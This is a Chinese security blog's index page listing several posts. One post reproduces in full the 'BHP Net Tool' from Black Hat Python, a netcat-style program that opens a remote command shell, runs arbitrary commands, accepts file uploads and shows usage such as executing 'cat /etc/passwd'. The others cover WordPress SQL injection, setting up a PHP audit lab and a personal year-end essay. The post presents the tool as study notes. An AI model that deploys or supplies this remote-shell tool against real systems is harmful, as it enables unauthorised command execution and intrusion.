<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Blog,L.N.,渗透测试,APT,代码审计,程序开发,网络安全,信息安全" />










<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/4/index.html">
<meta property="og:site_name" content="Hexo">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/4/"/>





  <title>Hexo</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description"></h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Startseite
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archiv
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2015/03/18/esc-sql-doh-wordpress-sql-injection-vulnerability/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2015/03/18/esc-sql-doh-wordpress-sql-injection-vulnerability/" itemprop="url">esc_sql Doh! WordPress SQL Injection Vulnerability</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2015-03-18T21:16:03+08:00">
                2015-03-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/0day漏洞/" itemprop="url" rel="index">
                    <span itemprop="name">0day漏洞</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>分析WordPress中esc_sql函数引起的注入危害<div><br></div><div>引言：</div><div><font face="Microsoft YaHei UI">&nbsp; &nbsp; 这篇文章说的不是esc_sql函数自身有什么逻辑上缺陷或者不足，而是说下关于二次开发者错误的使用此函数引起的注入漏洞。</font><br></div><div><font face="Microsoft YaHei UI">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2015/03/18/esc-sql-doh-wordpress-sql-injection-vulnerability/#more" rel="contents">
              Weiterlesen &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2015/01/13/读Black-Hat-Python-笔记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2015/01/13/读Black-Hat-Python-笔记/" itemprop="url">读Black Hat Python 笔记</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2015-01-13T13:34:56+08:00">
                2015-01-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Python-C-C/" itemprop="url" rel="index">
                    <span itemprop="name">Python|C|C++</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <pre class="brush:python; toolbar: true; auto-links: true;">import sys
import socket
import getopt
import threading
import subprocess

# define some global variables
listen      =False
command     =False
upload      =False
execute     =""
target      =""
upload_destination = ""
port        =0

def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen              - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run - execute the given file upon receiving a connection"
    print "-c --command             - initialize a command shell"
    print "-u --upload=destination  - ipon receiving connection upload a file and write to [destination]"

    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 6666 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 6666 -l -u=c:\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 6666 -l -e="cat /etc/passwd""
    print "echo ’ABCDEFGHI’ | ./bhpnet.py -t 192.168.11.12 -p 35"
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen =True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u","--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"

    #are we going to listen or just send data from stid?
    if not listen and len(target) and port &gt; 0:
        #read in the buffer from the commandline
        #this will block, so send CTRL-D if not sending input to stdin
        buffer = sys.stdin.read()

        #read data off
        client_sender(buffer)

    # we are going to listen and potentially upload things, execute commands,
    # and drop a shell back depending on our command line options above

    if listen:
        server_loop()

def client_sender(buffer):
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    try:
        #connect to our target host
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)

        while True:
            # now wait for data back
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response+= data

                if recv_len &lt; 4096:
                    break

            print response,

            #wait for more input
            buffer = raw_input("")
            buffer += "
"

            # send it off
            client.send(buffer)

    except:
        print "[&#42] Exception! Exiting."

        # tear down the connection
        client.close()

def server_loop():
    global target

    # if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        #spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler,
                                         args=(client_socket,))
        client_thread.start()

def run_command(command):
    # trim the newline
    command = command.rstrip()

    #run the command and get the out back

    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output = "Failed to execute command.
"

    #send the output back to the client
    return output

def client_handler(client_socket):
    global upload
    global execute
    global commnad

    #check for upload
    if len(upload_destination):

        #read in all of the bytes and write to our destination
        file_buffer = ""

        #kepp reading data until none is available

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        #now we take these bytes and try to them out
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s
" % upload_destination)
        except:
            client_socket.send("Fail to save file to %s
" %upload_destination)
    #check for command execution

    if len(execute):

        #run the command
        output = run_command(execute)

        client_socket.send(output)

    # now we go into another loop if a command shell was requested

    if command:
        while True:
            client_socket.send("&lt;BHP:#&gt; ")
            cmd_buffer = ""
            while "
" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # send back the command output
            response = run_command(cmd_buffer)

            #send back the response

            client_socket.send(response)

if __name__ == "__main__":
    main()</pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2015/01/01/2014年，是这样的一年/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2015/01/01/2014年，是这样的一年/" itemprop="url">2014年，是这样的一年</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2015-01-01T10:02:52+08:00">
                2015-01-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/琐碎杂事/" itemprop="url" rel="index">
                    <span itemprop="name">琐碎杂事</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp; 看了前几年的总结，或许心态发生的了很大的变化，现在记不清了为什么没有2013年的总结，或许当时我已经懒的忘记总结了。</p>
<p>2014年人生发生了很多意想不到却又情理之中的事情。一切有开始必就有结束，有些过程是人生必然会经历的，体验感受也是一种财富，或者这样的体验感受会让你纠结、痛苦、无奈、自责、失望??????但谁的人生不是这样呢？</p>
<p>&nbsp; &nbsp; 2014年，爷爷去世的一年。生命的诞生与结束，似是匆匆来匆匆去。第一次这样近距离的面对亲人的离世，让我久久难以释怀。脑海里那些挥之不去的画面，总能让我双眼湿润，思考生命的意义。我不知道我思考的答案是什么，我只能循着模糊的感觉蹒跚而行。</p>
<p>&nbsp; &nbsp; 2014年，半只脚踏出学校的一年。“实习”和“苦力”，我收获了什么我付出了什么，价值是否可估，我不知道，我也不想苦苦寻觅，生命中总有那么些未知的谜底，可能它会在你接下来的人生中逐一解开，但也可能它永久的就那么消逝在了时间长河之中，最后久而久之让你都忘记了当初的谜题在哪儿。有些事情就让我们在糊涂中度过吧，说不定此时的糊涂会在不久的将来给你一个你意想不到的收获，糊涂一次换一次惊喜，还是一笔不错的买卖。</p>
<p>&nbsp; &nbsp; 2014年，“你该找个女朋友了”。这八个字出现在了不同人口中，有同学、朋友、亲人、同事??????有些事情就成为记忆吧，还算美好的记忆。</p>
<p>&nbsp; &nbsp; 2014年，又出现了一个关系人生的选择。工作。我想的是什么？我要的是什么？我追求的是什么？我能这样做么？我可以这样做么？我应该这样做么？一个又一个只能自己回答的问题出现在脑海之中。弄的都有些像禅宗的“开悟”了。我不知道我悟了没有，我也不知道我的选择是对是错，或许选择根本没有对错，它的目的只是让人抉择，让人不由自主的思考，不由自主的一遍又一遍的问自己一些自己都不知道答案的问题，在这一遍又一遍的自问之中，静下心来突然有那么一点灵光，或许就是悟了。我不知道我脑海里曾经是否出现过灵光，我也不知道我所体会的悟了是不是真的悟了，就这样在只可意会不可言传之中我选择了360，放弃了我觉得我会选择的阿里，别问为什么，我不知道，硬要问，回答你的都是敷衍之词。</p>
<p>&nbsp; &nbsp; 2014年还是有很多没有改变的东西，我还是个穷光蛋，我还是没有女朋友，我还是不够努力，我还是没有实现吹过的牛逼，有这样的一段话，“一年又将过去了，我2015年的目标是搞定2014年那些原定于2013年完成的安排，不为别的，只为兑现我2012年时要完成的2011年年度计划的诺言和2010年吹过的牛逼”。2010年我高中毕业踏入了大学的校门，吹过很多自己要怎么怎么地的牛逼，兄弟们还记得当年我们一起吹过的牛逼么？</p>
<p>&nbsp; &nbsp; 2015年，目标已经在上面说过了，希望2015年的总结不会同上。在此祝愿爱我的和我爱的人们，红尘作伴活得潇潇洒洒。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2014/12/28/php-vuls-handbook-1-1测试环境的搭建/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2014/12/28/php-vuls-handbook-1-1测试环境的搭建/" itemprop="url">[php-vuls-handbook]1.1测试环境的搭建</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2014-12-28T09:50:42+08:00">
                2014-12-28
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/php-vuls-handbook/" itemprop="url" rel="index">
                    <span itemprop="name">php-vuls-handbook</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <div><span style="line-height:1.5;">0x01 前言</span></div>

<p>&nbsp; &nbsp;&nbsp;<span style="line-height:1.5;">习惯性的懒，这个两年前的事拖到现在，唉！虽然给自己找了万般理由，最后归结一个字还是懒，话不多说，开写。在做php代码审计之前必然需要搭建一个php运行环境。可能你会说：“这个有什么讲的，一个集成环境直接一键搭建不就行了”。这的确是一个方法，但你要知道一个漏洞的形成有很多因素，可能其中就有环境因素。</span></p>
<p><span style="line-height:1.5;">&nbsp; &nbsp; php测试环境基本由四部分组成：系统、php、web容器、数据库，系统常用的是windows/linux，web容器常用iis和apache，数据库常用mysql。</span></p>
<p></p>
<p><span style="line-height:1.5;"></span></p>
<p></p>
<div>0x02 PHP-IIS-MYSQL</div><br><div>&nbsp; &nbsp; 当然IIS一般是配合windows系统,你非要说我可以搭建在linux上,我也只能说fuck自己玩蛋去。当然我这说的wpim环境，不是集成环境，当然集成环境也是有的可以一键搭建，但是有个缺点是不能搭建特定环境，比如指定php版本，iis版本，mysql版本。</div><br><div><span style="line-height:1.5;">&nbsp; &nbsp; 由于我比较懒，其次是网上搭建方法一大堆，你懂的我就不搭建了，哈哈！&nbsp;&nbsp;</span></div><br><div><br><br></div><br><div><span style="line-height:1.5;">0x03</span>&nbsp;PHP-APACHE-MYSQL</div>

<p>&nbsp; &nbsp;&nbsp;<span style="line-height:1.5;">PHP-APACHE-MYSQL测试环境可能出现在windows和linux上了，有时候漏洞的形成和系统的一些特性有很大的关联，比如：windows短文件名可能造成数据库备份文件下载。</span></p>
<p><span style="line-height:1.5;">&nbsp; &nbsp; 环境的搭建当然涉及到不同系统，虚拟机是必备的，如果你要说你有钱你任性，你买个服务器，装个虚拟化也是可以的（ps:有人这么干）。至于具体搭建方法，网上一大堆（不要吐槽“网上一大堆”这句话，如果在这么丰富的资源下你还不能自己搭建好一个环境，说明你缺乏自学能力，那就不要学代码审计了，你是不可能有学会的，最多也就学个照葫芦画瓢）。</span></p>
<p></p>
<p><span style="line-height:1.5;"></span></p>
<p></p>
<div><span style="line-height:1.5;">0x04</span>&nbsp;php集成环境</div><br><div>&nbsp; &nbsp; 如果你说你懒，还是集成环境吧，特殊的时候再去搭建特殊环境。有几个集成环境还是不错的：</div><br><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;phpstudy多环境切换还是不错；</div><br><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; phpnow也可以<br><br></div><br><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; wamp也行<br><br></div><br><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; xampp这个配合php动态调试还不错<br><br></div><br><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 其他的还有很多了，百度一下一大堆。<br><br></div><br><div><br><br></div><br><div><span style="line-height:1.5;">0x0</span>5 php.ini、.htaccess、.user.ini</div>

<p>&nbsp; &nbsp; 这3个<span style="line-height:1.5;">文件是比较重要的文件了。php.ini如果你搭建了php环境你就知道它的重要性了，它是php的配置文件，在我们代码审计的时候，需要开始和关闭一些php功能，都需要修改它。</span></p>
<p><span style="line-height:1.5;">&nbsp; &nbsp; .htaccess是apache的一个配置文件，用来对相关目录下的网页做配置。</span></p>
<p></p>
<p><span style="line-height:1.5;">&nbsp; &nbsp; .user.ini是php的配置文件，但是是php5.3以后的东西还必须是</span><span style="color:#333333;font-family:arial;"><span style="font-size:13px;line-height:20.0200004577637px;">CGI/FastCGI SAPI</span></span><span style="line-height:1.5;">，这个以前被谈的少，是因为大家php环境大多还停留在5.2，现在被大家提起是因为环境升级，越来越多的生产环境用php5.3了，php5.3是一个比较大的临界点，5.3以前和5.3以后php多了很多特性，</span><span style="line-height:1.5;">.user.ini是其中一个，它具体有什么用呢，这个可以百度，我们关注他的应该是“相关目录”这四个字，</span><span style="line-height:1.5;">.htaccess也是有这四个字，“相关目录”说明可以出现在web目录下，能够出现在web目录下，而且对环境还有控制作用，这就是我们关注它的原因。比如asp.net中的web.config文件，很多服务器权限设置不严格，让我们可以访问到，这就要出事了。</span></p>
<p><span style="line-height:1.5;"></span></p>
<p></p>
<p><span style="line-height:1.5;">0x06 结束语</span></p>
<p><span style="line-height:1.5;">&nbsp; &nbsp; 完了，大牛看完然后吐槽：“写的什么啊，完全是地摊货嘛，没亮点”，必须承认没什么东西，能力有限，</span>php-vuls-handbook是写php相关代码审计入门知识，什么进阶篇，高阶篇，表示还没那个胆量装逼，现在也就写写入门装装逼，装的不好的望指正，我一定改正，装的更真实一些。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2014/12/26/黑吃黑的webshell后门/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2014/12/26/黑吃黑的webshell后门/" itemprop="url">黑吃黑的webshell后门</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2014-12-26T17:12:36+08:00">
                2014-12-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术文章/" itemprop="url" rel="index">
                    <span itemprop="name">技术文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>看见一个国外文档分析，国外的各种webshell里面的后门，黑吃黑，国内也不少。</p>
<p>&nbsp;</p>
<p><a href="http://h4x0resec.blogspot.tw/2014/12/online-shell-services-backdoor.html" target="_blank" rel="noopener">http://h4x0resec.blogspot.tw/2014/12/online-shell-services-backdoor.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2014/12/25/一个关于监控摄像头的文档/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2014/12/25/一个关于监控摄像头的文档/" itemprop="url">一个关于监控摄像头的文档</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2014-12-25T22:59:42+08:00">
                2014-12-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术文章/" itemprop="url" rel="index">
                    <span itemprop="name">技术文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp; mickey牛发我一个文档学习，是个2013年就发出来的文档，关于监控摄像头的文档，里面介绍了几种利用方法，做个笔记，记录下。</p>
<p>&nbsp;<a href="http://note.youdao.com/share/?id=5fce3c6f1cdf0b863defb5ef7dbdaa4f&amp;type=note" target="_blank" rel="noopener">http://note.youdao.com/share/?id=5fce3c6f1cdf0b863defb5ef7dbdaa4f&amp;type=note</a></p>
<p>&nbsp;</p>
<p>原始文档：见附件</p>
<p>&nbsp;</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2014/11/28/SiteServer-CMS-密码加解密小工具/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2014/11/28/SiteServer-CMS-密码加解密小工具/" itemprop="url">SiteServer CMS 密码加解密小工具</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2014-11-28T14:15:50+08:00">
                2014-11-28
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Python-C-C/" itemprop="url" rel="index">
                    <span itemprop="name">Python|C|C++</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>siteserver cms 自带的加解密函数,可逆的。</p>
<p>写个小工具方便操作</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2014/11/23/PageAdmin相关的工具/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2014/11/23/PageAdmin相关的工具/" itemprop="url">PageAdmin相关的工具</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2014-11-23T18:12:08+08:00">
                2014-11-23
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
